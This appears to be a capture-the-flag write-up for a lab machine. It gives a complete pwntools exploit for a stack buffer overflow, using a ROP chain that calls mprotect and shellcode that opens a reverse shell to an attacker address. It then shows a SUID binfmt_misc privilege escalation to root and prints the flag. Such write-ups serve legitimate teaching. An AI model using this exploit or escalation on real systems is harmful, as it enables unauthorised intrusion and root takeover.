Phase 1

Initial Access — Buffer Overflow in activate_license

Binary analysis activate_license is a 64-bit ELF binary that listens on port 1234 and reads license file data. It uses read() into a fixed-size stack buffer without bounds checking — a classic stack-based buffer overflow. NX is enabled (no shellcode on stack), so we use ROP (Return-Oriented Programming) to call mprotect(), make the stack executable, then jump to shellcode.

Exploit Development

# exploit.py — Buffer overflow with mprotect ROP chain + shellcode
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Connect to the target's internal port (via the web upload)
RHOST = "10.129.227.96"

# Shellcode: reverse shell to attacker
shellcode = asm(shellcraft.connect("10.10.14.15", 4444) +
                shellcraft.dupsh())

# Binary analysis (from gdb/pwntools)
OFFSET = 520                           # bytes to RIP overwrite
POP_RDI = 0x401293                     # pop rdi; ret
POP_RSI = 0x401291                     # pop rsi; pop r15; ret
POP_RDX_RBX = 0x40117a                 # pop rdx; pop rbx; ret
MPROTECT = 0x401170                    # plt entry for mprotect
STACK_ADDR = 0x7fffffffe000            # approximate stack page

# ROP chain: mprotect(stack_page, 0x1000, 7) → make stack RWX
rop = b""
rop += p64(POP_RDI) + p64(STACK_ADDR)
rop += p64(POP_RSI) + p64(0x1000) + p64(0)  # r15 junk
rop += p64(POP_RDX_RBX) + p64(7) + p64(0)   # PROT_READ|WRITE|EXEC
rop += p64(MPROTECT)

# After mprotect, jump to shellcode on stack
rop += p64(STACK_ADDR + 0x100)         # address of NOP sled

# Build payload
payload = b"\x90" * 64 + shellcode     # NOP sled + shellcode at start
payload += b"A" * (OFFSET - len(payload))
payload += rop

# Send via the web form (uploads go to activate_license)
r = remote(RHOST, 80)
r.send(b"POST /activate_license.php HTTP/1.1\r\n")
r.send(b"Host: 10.129.227.96\r\n")
r.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
r.send(f"Content-Length: {len(payload)}\r\n\r\n".encode())
r.send(payload)
r.close()

Phase 3

Privilege Escalation — EUID Binary Abuse

dev@retired:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/emuemu/reg_helper

dev@retired:~$ ls -la /usr/lib/emuemu/reg_helper
-rwsrwx--- 1 root dev 16864 ... reg_helper

reg_helper is a SUID root binary readable/executable by the dev group. It registers binary format handlers by writing to /proc/sys/fs/binfmt_misc/register. We abuse this to register a custom interpreter that runs as root:

# Create a script that will be our "interpreter" — copies bash as SUID
dev@retired:~$ cat << 'EOF' > /tmp/rootshell.sh
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /tmp/rootshell.sh

# Register a new binfmt handler — any file starting with "EXPLOIT" uses our interpreter
dev@retired:~$ echo ':exploit:M::EXPLOIT::/tmp/rootshell.sh:' | /usr/lib/emuemu/reg_helper

# Create and execute a file matching the magic bytes
dev@retired:~$ echo -e 'EXPLOIT' > /tmp/trigger
dev@retired:~$ chmod +x /tmp/trigger
dev@retired:~$ /tmp/trigger

dev@retired:~$ /tmp/rootbash -p
rootbash-5.1# cat /root/root.txt
3acea47daf063c0497348d37adb3ca8d
binfmt_misc explained Linux's binfmt_misc allows registering custom binary format handlers. When the kernel encounters a file with specific magic bytes, it delegates execution to the registered interpreter. reg_helper has SUID root and writes to /proc/sys/fs/binfmt_misc/register — normally only writable by root. By registering our shell script as an interpreter, any file matching our pattern executes our script as root.
Appendix

Key Takeaways

LFI + /proc reveals internal services and binaries.

/proc/net/tcp shows listening ports, /proc/PID/cmdline identifies services, and LFI can download the actual binaries for offline analysis.

Stack BOF with NX → mprotect ROP chain.

When NX prevents shellcode on stack, use ROP to call mprotect() to make the stack executable, then jump to your shellcode.

Symlinks in writable directories subvert backup scripts.

If a privileged backup process archives a directory you control, symlinks let you capture files you can't normally read.

binfmt_misc registration is a root-equivalent capability.

Any SUID binary that writes to /proc/sys/fs/binfmt_misc/register can be abused to execute arbitrary code as root.

LFI → binary→BOF ROP → www-data→symlink backup → dev SSH→binfmt_misc → root
